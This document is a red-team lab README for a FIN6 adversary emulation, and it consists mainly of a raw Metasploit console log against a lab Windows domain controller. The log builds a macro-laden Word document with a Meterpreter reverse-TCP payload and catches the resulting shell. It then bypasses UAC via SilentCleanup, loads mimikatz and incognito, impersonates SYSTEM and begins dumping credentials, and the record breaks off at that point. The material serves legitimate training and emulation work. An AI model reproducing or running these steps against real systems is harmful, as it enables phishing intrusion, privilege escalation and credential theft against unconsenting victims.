# FIN6 Office Macro Initial Access

---

# FIN6 - Adversary Emulation Plan (Lab 1.3)

This repository contains a full simulation of the FIN6 adversary group behavior as outlined in MITRE Engenuity’s **Lab 1.3**: *Executing the FIN6 Emulation Plan*. It includes procedures from **Initial Access** via malicious Word macros to **exfiltration over FTP**, emulating real-world FIN6 TTPs.

> ⚠️ For **educational and red team simulation purposes only**. Do not use in unauthorized environments.

---

## 🎯 Objectives

- Execute Phase 1 of the [FIN6 Emulation Plan](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin6/Emulation_Plan)
- Simulate FIN6’s techniques across:
  - Initial Access
  - Discovery
  - Privilege Escalation
  - Credential Dumping
  - Exfiltration

---

## 🧪 Lab Components

| Phase                | Technique                               | MITRE ID         |
|---------------------|------------------------------------------|------------------|
| Initial Access       | Spearphishing via Word Macro            | T1566.001        |
| Discovery            | Domain Users, Computers, Groups         | T1087, T1018     |
| Priv. Escalation     | Token Impersonation (getsystem)         | T1134            |
| Credential Dumping   | Mimikatz, NTDS.dit extraction           | T1003.001/003    |
| Exfiltration         | FTP via script                          | T1048.003        |

---

## 🛠️ Setup

### Requirements

- Kali Linux (Attacker VM)
- Windows Server (targetDC)
- MS Office (for macro execution)
- Python3 & Metasploit installed
- Internet or LAN connectivity

---

## 🧰 Tools Used

- `Metasploit Framework`
- `Office Word Macro Exploit`
- `AdFind.exe`
- `PowerShell`
- `vssadmin`, `reg`, `nltest`
- `7-Zip` CLI (`7.exe`)
- `pyftpdlib` for FTP exfiltration

---

## 🧵 Lab Workflow Summary

1. **Create Macro Payload**
   ```bash

    ┌──(attacker㉿kali)-[~/AdversaryEmulation/labs/lab_1.3]
    └─$ sudo msfconsole -q
    msf6 > search word_macro
    
    Matching Modules
    ================
    
       #  Name                                                     Disclosure Date  Rank       Check  Description
       -  ----                                                     ---------------  ----       -----  -----------
       0  exploit/multi/fileformat/office_word_macro               2012-01-10       excellent  No     Microsoft Office Word Malicious Macro Execution
       1    \_ target: Microsoft Office Word on Windows            .                .          .      .
       2    \_ target: Microsoft Office Word on Mac OS X (Python)  .                .          .      .
    
    
    Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/fileformat/office_word_macro
    After interacting with a module you can manually set a TARGET with set TARGET 'Microsoft Office Word on Mac OS X (Python)'
    
    msf6 > use 0
    [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
    msf6 exploit(multi/fileformat/office_word_macro) > show options
    
    Module options (exploit/multi/fileformat/office_word_macro):
    
       Name            Current Setting  Required  Description
       ----            ---------------  --------  -----------
       CUSTOMTEMPLATE                   no        A docx file that will be used as a template to build the exploit
       FILENAME        msf.docm         yes       The Office document macro file (docm)
    
    
    Payload options (windows/meterpreter/reverse_tcp):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST     192.168.125.103  yes       The listen address (an interface may be specified)
       LPORT     4444             yes       The listen port
    
       **DisablePayloadHandler: True   (no handler will be created!)**
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Microsoft Office Word on Windows
    
    
    
    View the full module info with the info, or info -d command.
    
    msf6 exploit(multi/fileformat/office_word_macro) > exploit
    
    [*] Using template: /usr/share/metasploit-framework/data/exploits/office_word_macro/template.docx
    [*] Injecting payload in document comments
    [*] Injecting macro and other required files in document
    [*] Finalizing docm: msf.docm
    [+] msf.docm stored at /root/.msf4/local/msf.docm
    msf6 exploit(multi/fileformat/office_word_macro) > use exploit/multi/handler
    [*] Using configured payload generic/shell_reverse_tcp
    msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > show options
    
    Payload options (windows/meterpreter/reverse_tcp):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST                      yes       The listen address (an interface may be specified)
       LPORT     4444             yes       The listen port
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Wildcard Target
    
    
    
    View the full module info with the info, or info -d command.
    
    msf6 exploit(multi/handler) > set LHOST 192.168.125.103
    LHOST => 192.168.125.103
    msf6 exploit(multi/handler) > set EXITFUNC thread
    EXITFUNC => thread
    msf6 exploit(multi/handler) > exploit
    
    [*] Started reverse TCP handler on 192.168.125.103:4444 
    
    [*] Sending stage (176198 bytes) to 192.168.125.104
    [*] Meterpreter session 1 opened (192.168.125.103:4444 -> 192.168.125.104:50369) at 2025-07-17 14:50:41 -0400
    
    meterpreter > 
    meterpreter > sysinfo
    Computer        : TARGETDC
    OS              : Windows Server 2019 (10.0 Build 17763).
    Architecture    : x64
    System Language : en_US
    Domain          : MAD
    Logged On Users : 13
    Meterpreter     : x86/windows
    meterpreter > pgrep explorer.exe
    3856
    meterpreter > migrate 3856
    [*] Migrating from 4876 to 3856...
    [*] Migration completed successfully.
    meterpreter > getuid
    Server username: MAD\madAdmin
    meterpreter > getprivs
    
    Enabled Process Privileges
    ==========================
    
    Name
    ----
    SeChangeNotifyPrivilege
    SeIncreaseWorkingSetPrivilege
    SeMachineAccountPrivilege
    
    meterpreter > shell
    Process 4540 created.
    Channel 1 created.
    Microsoft Windows [Version 10.0.17763.1158]
    (c) 2018 Microsoft Corporation. All rights reserved.
    
    C:\Windows\system32>
    
    C:\Windows\system32>net user
    net user
    
    User accounts for \\TARGETDC
    
    -------------------------------------------------------------------------------
    Admin                    Administrator            cloudbase-init           
    krbtgt                   madAdmin                 
    The command completed successfully.
    
    
    C:\Windows\system32>net localgroup administrators
    net localgroup administrators
    Alias name     administrators
    Comment        Administrators have complete and unrestricted access to the computer/domain
    
    Members
    
    -------------------------------------------------------------------------------
    Admin
    Administrator
    cloudbase-init
    Domain Admins
    Enterprise Admins
    madAdmin
    The command completed successfully.
    
    
    C:\Windows\system32>^C
    Terminate channel 1? [y/N]  y
    meterpreter > load kiwi
    Loading extension kiwi...
      .#####.   mimikatz 2.2.0 20191125 (x64/windows)
     .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
     ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
     ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
     '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
      '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
    
    Success.
    meterpreter > Interrupt: use the 'exit' command to quit
    meterpreter > background
    [*] Backgrounding session 1...
    msf6 exploit(multi/handler) > search bypassuac
    
    Matching Modules
    ================
    
       #   Name                                                   Disclosure Date  Rank       Check  Description
       -   ----                                                   ---------------  ----       -----  -----------
       0   exploit/windows/local/bypassuac_windows_store_filesys  2019-08-22       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)
       1   exploit/windows/local/bypassuac_windows_store_reg      2019-02-19       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry
       2   exploit/windows/local/bypassuac                        2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass
       3     \_ target: Windows x86                               .                .          .      .
       4     \_ target: Windows x64                               .                .          .      .
       5   exploit/windows/local/bypassuac_injection              2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)
       6     \_ target: Windows x86                               .                .          .      .
       7     \_ target: Windows x64                               .                .          .      .
       8   exploit/windows/local/bypassuac_injection_winsxs       2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS
       9     \_ target: Windows x86                               .                .          .      .
       10    \_ target: Windows x64                               .                .          .      .
       11  exploit/windows/local/bypassuac_vbs                    2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)
       12  exploit/windows/local/bypassuac_comhijack              1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)
       13  exploit/windows/local/bypassuac_eventvwr               2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)
       14    \_ target: Windows x86                               .                .          .      .
       15    \_ target: Windows x64                               .                .          .      .
       16  exploit/windows/local/bypassuac_sdclt                  2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Shell Open Registry Key)
       17  exploit/windows/local/bypassuac_silentcleanup          2019-02-24       excellent  No     Windows Escalate UAC Protection Bypass (Via SilentCleanup)
       18  exploit/windows/local/bypassuac_dotnet_profiler        2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via dot net profiler)
       19  exploit/windows/local/bypassuac_fodhelper              2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)
       20    \_ target: Windows x86                               .                .          .      .
       21    \_ target: Windows x64                               .                .          .      .
       22  exploit/windows/local/bypassuac_sluihijack             2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)
       23    \_ target: Windows x86                               .                .          .      .
       24    \_ target: Windows x64                               .                .          .      .
    
    
    Interact with a module by name or index. For example info 24, use 24 or use exploit/windows/local/bypassuac_sluihijack                                                                                                                    
    After interacting with a module you can manually set a TARGET with set TARGET 'Windows x64'
    
    msf6 exploit(multi/handler) > use 17
    [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
    msf6 exploit(windows/local/bypassuac_silentcleanup) > show options
    
    Module options (exploit/windows/local/bypassuac_silentcleanup):
    
       Name       Current Setting                         Required  Description
       ----       ---------------                         --------  -----------
       PSH_PATH   %WINDIR%\System32\WindowsPowershell\v1  yes       The path to the Powershell binary.
                  .0\powershell.exe
       SESSION                                            yes       The session to run this module on
       SLEEPTIME  0                                       no        The time (ms) to sleep before running SilentCleanup
    
    
    Payload options (windows/meterpreter/reverse_tcp):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST     192.168.125.103  yes       The listen address (an interface may be specified)
       LPORT     4444             yes       The listen port
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Microsoft Windows
    
    
    
    View the full module info with the info, or info -d command.
    
    msf6 exploit(windows/local/bypassuac_silentcleanup) > set LPORT 5555
    LPORT => 5555
    msf6 exploit(windows/local/bypassuac_silentcleanup) > set SESSION 1
    SESSION => 1
    msf6 exploit(windows/local/bypassuac_silentcleanup) > exploit
    
    [*] Started reverse TCP handler on 192.168.125.103:5555 
    [+] Part of Administrators group! Continuing...
    [*] Sending stage (176198 bytes) to 192.168.125.104
    [+] Deleted C:\Users\madAdmin\AppData\Local\Temp\2\VresrvVd.ps1
    [*] Meterpreter session 2 opened (192.168.125.103:5555 -> 192.168.125.104:50481) at 2025-07-17 15:01:23 -0400
    
    meterpreter > sessions
    Usage: sessions [options] or sessions [id]
    
    Interact with a different session ID.
    
    OPTIONS:
    
        -h, --help           Show this message
        -i, --interact <id>  Interact with a provided session ID
    
    meterpreter > getuid
    Server username: MAD\madAdmin
    meterpreter > getprivs
    
    Enabled Process Privileges
    ==========================
    
    Name
    ----
    SeBackupPrivilege
    SeChangeNotifyPrivilege
    SeCreateGlobalPrivilege
    SeCreatePagefilePrivilege
    SeCreateSymbolicLinkPrivilege
    SeDebugPrivilege
    SeDelegateSessionUserImpersonatePrivilege
    SeEnableDelegationPrivilege
    SeImpersonatePrivilege
    SeIncreaseBasePriorityPrivilege
    SeIncreaseQuotaPrivilege
    SeIncreaseWorkingSetPrivilege
    SeLoadDriverPrivilege
    SeMachineAccountPrivilege
    SeManageVolumePrivilege
    SeProfileSingleProcessPrivilege
    SeRemoteShutdownPrivilege
    SeRestorePrivilege
    SeSecurityPrivilege
    SeShutdownPrivilege
    SeSystemEnvironmentPrivilege
    SeSystemProfilePrivilege
    SeSystemtimePrivilege
    SeTakeOwnershipPrivilege
    SeTimeZonePrivilege
    SeUndockPrivilege
    
    meterpreter > load kiwi
    Loading extension kiwi...
      .#####.   mimikatz 2.2.0 20191125 (x86/windows)
     .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
     ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
     ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
     '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
      '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
    
    [!] Loaded x86 Kiwi on an x64 architecture.
    
    Success.
    meterpreter > load incognito
    Loading extension incognito...Success.
    meterpreter > list_tokens -u
    [-] Warning: Not currently running as SYSTEM, not all tokens will be available
                 Call rev2self if primary process token is SYSTEM
    
    Delegation Tokens Available
    ========================================
    MAD\madAdmin
    NT AUTHORITY\SYSTEM
    
    Impersonation Tokens Available
    ========================================
    No tokens available
    
    meterpreter > list_tokens -u
    [-] Warning: Not currently running as SYSTEM, not all tokens will be available
                 Call rev2self if primary process token is SYSTEM
    
    Delegation Tokens Available
    ========================================
    MAD\madAdmin
    NT AUTHORITY\SYSTEM
    
    Impersonation Tokens Available
    ========================================
    No tokens available
    
    meterpreter > background
    [*] Backgrounding session 2...
    msf6 exploit(windows/local/bypassuac_silentcleanup) > sessions
    
    Active sessions
    ===============
    
      Id  Name  Type                     Information              Connection
      --  ----  ----                     -----------              ----------
      1         meterpreter x64/windows  MAD\madAdmin @ TARGETDC  192.168.125.103:4444 -> 192.168.125.104:50369 (192.16
                                                                  8.125.104)
      2         meterpreter x86/windows  MAD\madAdmin @ TARGETDC  192.168.125.103:5555 -> 192.168.125.104:50481 (192.16
                                                                  8.125.104)
    
    msf6 exploit(windows/local/bypassuac_silentcleanup) > sessions -i 2
    [*] Starting interaction with 2...
    
    meterpreter > getprvs
    [-] Unknown command: getprvs. Did you mean getprivs? Run the help command for more details.
    meterpreter > getprivs
    
    Enabled Process Privileges
    ==========================
    
    Name
    ----
    SeBackupPrivilege
    SeChangeNotifyPrivilege
    SeCreateGlobalPrivilege
    SeCreatePagefilePrivilege
    SeCreateSymbolicLinkPrivilege
    SeDebugPrivilege
    SeDelegateSessionUserImpersonatePrivilege
    SeEnableDelegationPrivilege
    SeImpersonatePrivilege
    SeIncreaseBasePriorityPrivilege
    SeIncreaseQuotaPrivilege
    SeIncreaseWorkingSetPrivilege
    SeLoadDriverPrivilege
    SeMachineAccountPrivilege
    SeManageVolumePrivilege
    SeProfileSingleProcessPrivilege
    SeRemoteShutdownPrivilege
    SeRestorePrivilege
    SeSecurityPrivilege
    SeShutdownPrivilege
    SeSystemEnvironmentPrivilege
    SeSystemProfilePrivilege
    SeSystemtimePrivilege
    SeTakeOwnershipPrivilege
    SeTimeZonePrivilege
    SeUndockPrivilege
    
    meterpreter > load incognito
    [!] The "incognito" extension has already been loaded.
    meterpreter > list_tokens -u
    [-] Warning: Not currently running as SYSTEM, not all tokens will be available
                 Call rev2self if primary process token is SYSTEM
    
    Delegation Tokens Available
    ========================================
    MAD\madAdmin
    NT AUTHORITY\SYSTEM
    
    Impersonation Tokens Available
    ========================================
    No tokens available
    
    meterpreter > load kiwi
    [!] The "kiwi" extension has already been loaded.
    meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
    [-] Warning: Not currently running as SYSTEM, not all tokens will be available
                 Call rev2self if primary process token is SYSTEM
    [+] Delegation token available
    [+] Successfully impersonated user NT AUTHORITY\SYSTEM
    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM
    meterpreter > creds_all 
    [+] Running as SYSTEM
    [*] Retrieving all credentials


   ```



---
